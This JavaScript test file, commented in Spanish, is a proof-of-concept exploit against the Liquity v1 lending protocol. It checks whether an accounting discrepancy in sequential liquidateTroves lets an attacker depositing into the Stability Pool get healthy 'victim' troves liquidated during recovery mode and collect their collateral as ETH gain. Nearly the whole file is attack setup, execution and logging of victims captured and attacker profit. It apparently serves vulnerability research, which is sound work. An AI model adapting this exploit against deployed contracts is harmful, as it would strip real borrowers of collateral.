const deploymentHelper = require("../utils/deploymentHelpers.js")
const testHelpers = require("../utils/testHelpers.js")
const th = testHelpers.TestHelper
const dec = th.dec, toBN = th.toBN, ZERO_ADDRESS = th.ZERO_ADDRESS
const TroveManagerTester = artifacts.require("./TroveManagerTester")
const LUSDToken = artifacts.require("./LUSDToken.sol")

/*
  ============================================================================
  PoC — PRODUCTION Liquity v1 (5174ecd)
  CUANTAS VICTIMAS PUEDE CAPTURAR EL ATACANTE EN UNA SECUENCIA liquidateTroves(n)?

  La ruta secuencial (L583) resta `collSurplus` pero NO `collGasCompensation`, luego el
  error de tracking es MENOR que en la ruta batch (L722).  Se investiga si eso permite
  capturar mas de una victima por secuencia, o si el `break`/cambio de rama lo impide.

  Tambien se prueba la variante con N triggers y N victimas en la MISMA secuencia.
  ============================================================================
*/
contract("PoC Sequential Multi-Victim: Liquity v1 prod 5174ecd", (accounts) => {
  const [owner, alice, bob, carol, dennis, erin, freddy, george] = accounts
  let contracts, priceFeed, stabilityPool, troveManager, borrowerOperations, collSurplusPool, lusdToken

  beforeEach(async () => {
    contracts = await deploymentHelper.deployLiquityCore()
    contracts.troveManager = await TroveManagerTester.new()
    contracts.lusdToken = await LUSDToken.new(contracts.troveManager.address,
      contracts.stabilityPool.address, contracts.borrowerOperations.address)
    const LQTYContracts = await deploymentHelper.deployLQTYContracts(owner, owner, owner)
    priceFeed = contracts.priceFeedTestnet; stabilityPool = contracts.stabilityPool
    troveManager = contracts.troveManager; borrowerOperations = contracts.borrowerOperations
    collSurplusPool = contracts.collSurplusPool; lusdToken = contracts.lusdToken
    await deploymentHelper.connectLQTYContracts(LQTYContracts)
    await deploymentHelper.connectCoreContracts(contracts, LQTYContracts)
    await deploymentHelper.connectLQTYContractsToCore(LQTYContracts, contracts)
  })

  const openExact = async (coll, targetCompositeDebt, from) => {
    let m = targetCompositeDebt.sub(toBN(dec(200, 18)))
    for (let i = 0; i < 6; i++) {
      const fee = await troveManager.getBorrowingFee(m)
      m = targetCompositeDebt.sub(toBN(dec(200, 18))).sub(fee)
    }
    await borrowerOperations.openTrove(toBN(dec(100,16)), m, ZERO_ADDRESS, ZERO_ADDRESS,
      { from, value: coll })
    const t = await troveManager.getEntireDebtAndColl(from)
    return { coll: t.coll, debt: t.debt }
  }
  const ETH = toBN(dec(1,18))
  const bal = async a => toBN(await web3.eth.getBalance(a))

  // Escenario: N victimas con ICR 1.60 @200, 2 triggers con ICR 1.50 @200, atacante ICR 1.60
  const setup = async (nVictims) => {
    await priceFeed.setPrice(dec(200,18)); await priceFeed.fetchPrice()
    const victims = []
    for (const v of [carol, erin, freddy, george].slice(0, nVictims)) {
      victims.push({ addr: v, ...(await openExact(toBN(dec(4000,18)), toBN(dec(500000,18)), v)) })
    }
    const dennisT = await openExact(toBN(dec(4800,18)), toBN(dec(600000,18)), dennis)
    await openExact(toBN("24750000000000000000"), toBN(dec(3300,18)), alice)
    await openExact(toBN("15000000000000000000"), toBN(dec(2000,18)), bob)
    await priceFeed.setPrice(dec(170,18))
    const P = await priceFeed.getPrice()
    const realTCR = await th.getTCR(contracts)
    return { victims, P, realTCR, recMode: await th.checkRecoveryMode(contracts) }
  }

  for (const N of [1, 2, 3]) {
    it(`SECUENCIAL: ${N} victimas en una sola secuencia liquidateTroves(10)`, async () => {
      const s = await setup(N)
      console.log(`\n--- N=${N} ---`)
      console.log("TCR real", s.realTCR.toString(), "recoveryMode", s.recMode.toString())
      for (const v of s.victims) {
        const i = await troveManager.getCurrentICR(v.addr, s.P)
        console.log("  vict", v.addr.slice(0,8), "ICR", i.toString(), ">=TCR?", i.gte(s.realTCR))
      }
      // el atacante pone LUSD en el SP
      const erinSeed = toBN(dec(50000,18))
      await stabilityPool.provideToSP((await lusdToken.balanceOf(dennis)).sub(erinSeed).sub(toBN(dec(1,18))),
                                      ZERO_ADDRESS, { from: dennis })
      await lusdToken.transfer(erin, erinSeed, { from: dennis })
      await stabilityPool.provideToSP(erinSeed, ZERO_ADDRESS, { from: erin })

      const ethB = await bal(dennis)
      const spDepBefore = await stabilityPool.getTotalLUSDDeposits()
      const tx = await troveManager.liquidateTroves(10, { from: owner })
      const liq = []
      for (const log of tx.logs) if (log.event === "TroveLiquidated")
        liq.push(log.args._borrower.slice(0,8) + ":" + log.args._debt.toString())
      console.log("  LIQ:", liq.join("  "))
      let spurious = 0
      for (const v of s.victims)
        if ((await troveManager.getTroveStatus(v.addr)).toString() === "3") spurious++
      console.log("  victimas capturadas:", spurious, "de", s.victims.length)
      await stabilityPool.withdrawFromSP(0, { from: dennis })
      const gain = await stabilityPool.getDepositorETHGain(dennis)
      console.log("  attacker ETH gain:", gain.div(ETH).toString(), "ETH")
      console.log("  SP ETH:", (await web3.eth.getBalance(stabilityPool.address)).toString())
      console.log("  SP LUSD:", (await stabilityPool.getTotalLUSDDeposits()).toString(),
                  "de", spDepBefore.toString())
      console.log("  TCR real final:", (await th.getTCR(contracts)).toString())
    })
  }

  it("SECUENCIAL: N lotes independientes (1 trigger + 1 victima por lote)", async () => {
    const s = await setup(3)
    console.log("TCR real", s.realTCR.toString())
    const erinSeed = toBN(dec(50000,18))
    await stabilityPool.provideToSP((await lusdToken.balanceOf(dennis)).sub(erinSeed).sub(toBN(dec(1,18))),
                                    ZERO_ADDRESS, { from: dennis })
    await lusdToken.transfer(erin, erinSeed, { from: dennis })
    await stabilityPool.provideToSP(erinSeed, ZERO_ADDRESS, { from: erin })
    const ethB = await bal(dennis)
    // lote 1: trigger bob + victima carol
    await troveManager.liquidateTroves(10, { from: owner })
    console.log("tras lote 1: carol status", (await troveManager.getTroveStatus(carol)).toString(),
                " TCR", (await th.getTCR(contracts)).toString())
    console.log("  SP LUSD:", (await stabilityPool.getTotalLUSDDeposits()).toString())
    // lote 2: ¿queda LUSD en el SP para otra victima?
    console.log("  LUSD restante:", (await stabilityPool.getTotalLUSDDeposits()).toString())
    console.log("  gain del atacante:", (await stabilityPool.getDepositorETHGain(dennis)).div(ETH).toString())
  })
})
